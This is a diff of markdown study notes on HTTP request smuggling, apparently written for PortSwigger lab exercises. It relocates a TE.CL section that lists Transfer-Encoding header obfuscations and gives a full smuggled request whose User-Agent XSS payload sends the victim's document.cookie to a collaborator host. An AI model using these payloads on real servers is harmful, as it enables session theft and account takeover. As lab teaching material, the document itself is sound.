@@ -897,14 +897,71 @@ csrf=TheCSRFTokenValue&username=carlos
 ## HTTP Request Smuggling  
 
 >Architecture with front-end and back-end server, and front-end or back-end does not support chunked encoding **(HEX)** or content-length **(Decimal)**. Bypass security controls to retrieve the victim's request and use the victim user's cookies to access their account.  
-  
+
+[TE.CL dualchunk - Transfer-encoding obfuscated](#tecl-dualchunk---transfer-encoding-obfuscated)    
 [TE.CL multiCase - Admin blocked](#tecl-multiCase---admin-blocked)  
 [CL.TE multiCase - Admin blocked](#clte-multicase---admin-blocked)  
-[CL.TE multiCase - Content-Length](#clte-multicase---content-length)  
+[CL.TE multiCase - Content-Length Cookie Stealer](#clte-multicase---content-length)  
 [CL.TE multiCase - User-Agent Cookie Stealer](#clte-multicase---user-agent-cookie-stealer)  
-[TE.CL dualchunk - Transfer-encoding obfuscated](#tecl-dualchunk---transfer-encoding-obfuscated)  
-[HTTP/2 smuggling via CRLF injection](#http2-smuggling-via-crlf-injection)  
-[HTTP/2 TE desync v10a h2path](#http2-te-desync-v10a-h2path)  
+[HTTP/2 smuggling - CRLF injection Cookie Stealer](#http2-smuggling-via-crlf-injection)  
+[HTTP/2 TE - Admin Cookie Stealer](#http2-te-desync-v10a-h2path)  
+
+### TE.CL dualchunk - Transfer-encoding obfuscated  
+
+>If Duplicate header names are allowed, and the vulnerability is detected as **dualchunk**, then add an additional header with name and value = **Transfer-encoding: cow**.  Use **obfuscation** techniques with second TE.  
+
+```
+Transfer-Encoding: xchunked
+
+Transfer-Encoding : chunked
+
+Transfer-Encoding: chunked
+Transfer-Encoding: x
+
+Transfer-Encoding:[tab]chunked
+
+[space]Transfer-Encoding: chunked
+
+X: X[\n]Transfer-Encoding: chunked
+
+Transfer-Encoding
+: chunked
+
+Transfer-encoding: identity
+Transfer-encoding: cow
+```  
+
+>Some servers that do support the Transfer-Encoding header can be induced not to process it if the header is **obfuscation** in some way.  
+
+>On Repeater menu ensure that the **"Update Content-Length"** option is unchecked.  
+
+```html
+POST / HTTP/1.1
+Host: TARGET.net
+Content-Type: application/x-www-form-urlencoded
+Content-length: 4
+Transfer-Encoding: chunked
+Transfer-encoding: identity
+
+e6
+GET /post?postId=4 HTTP/1.1
+User-Agent: a"/><script>document.location='http://COLLABORATOR.com/?c='+document.cookie;</script>
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 15
+
+x=1
+0\r\n  
+\r\n
+  
+```  
+
+![GPost Obfuscating the TE header](images/gpost.png)  
+
+>**Note:** You need to include the trailing sequence **\r\n\r\n** following the final **0**.  
+
+[PortSwigger Lab: HTTP request smuggling, obfuscating the Transfer-Encoding (TE) header](https://portswigger.net/web-security/request-smuggling/lab-obfuscating-te-header)  
+  
+>Wonder how often this scenario occur that hacker is able to steal visiting user request via HTTP Sync vulnerability?  
   
 ### TE.CL multiCase - Admin blocked  
 
@@ -1002,10 +1059,9 @@ csrf=ValidCSRFCookieValue&postId=8&name=c&email=c%40c.c&website=&comment=c
 ![Exploiting HTTP request smuggling to capture other users' requests](images/victim-request-captured-blog-comment.png)  
 
 [PortSwigger Lab: Exploiting HTTP request smuggling to capture other users' requests](https://portswigger.net/web-security/request-smuggling/exploiting/lab-capture-other-users-requests)  
-
-
-### CL.TE multiCase - User-Agent Cookie Stealer
-
+  
+### CL.TE multiCase - User-Agent Cookie Stealer  
+  
 >***Identify*** the UserAgent value is stored in the GET request loading the blog comment form, and stored in **User-Agent** hidden value. Exploiting HTTP request smuggling to deliver reflected XSS using **User-Agent** value that is then placed in a smuggled request.  
 
 >Basic Cross Site Scripting Payload escaping out of HTML document.  
@@ -1046,63 +1102,6 @@ x=1
 ![Collaborator capture XSS Request from victim browsing target](images/collaborator-xss-Request-received.png)  
 
 [PortSwigger Lab: Exploiting HTTP request smuggling to deliver reflected XSS](https://portswigger.net/web-security/request-smuggling/exploiting/lab-deliver-reflected-xss)  
-
-### TE.CL dualchunk - Transfer-encoding obfuscated  
-
->If Duplicate header names are allowed, and the vulnerability is detected as **dualchunk**, then add an additional header with name and value = **Transfer-encoding: cow**.  Use **obfuscation** techniques with second TE.  
-
-```
-Transfer-Encoding: xchunked
-
-Transfer-Encoding : chunked
-
-Transfer-Encoding: chunked
-Transfer-Encoding: x
-
-Transfer-Encoding:[tab]chunked
-
-[space]Transfer-Encoding: chunked
-
-X: X[\n]Transfer-Encoding: chunked
-
-Transfer-Encoding
-: chunked
-
-Transfer-encoding: identity
-Transfer-encoding: cow
-```  
-
->Some servers that do support the Transfer-Encoding header can be induced not to process it if the header is **obfuscation** in some way.  
-
->On Repeater menu ensure that the **"Update Content-Length"** option is unchecked.  
-
-```html
-POST / HTTP/1.1
-Host: TARGET.net
-Content-Type: application/x-www-form-urlencoded
-Content-length: 4
-Transfer-Encoding: chunked
-Transfer-encoding: identity
-
-e6
-GET /post?postId=4 HTTP/1.1
-User-Agent: a"/><script>document.location='http://COLLABORATOR.com/?c='+document.cookie;</script>
-Content-Type: application/x-www-form-urlencoded
-Content-Length: 15
-
-x=1
-0\r\n  
-\r\n
-  
-```  
-
-![GPost Obfuscating the TE header](images/gpost.png)  
-
->**Note:** You need to include the trailing sequence **\r\n\r\n** following the final **0**.  
-
-[PortSwigger Lab: HTTP request smuggling, obfuscating the Transfer-Encoding (TE) header](https://portswigger.net/web-security/request-smuggling/lab-obfuscating-te-header)  
-  
->Wonder how often this scenario occur that hacker is able to steal visiting user request via HTTP Sync vulnerability?  
   
 ### HTTP/2 smuggling via CRLF injection  
 
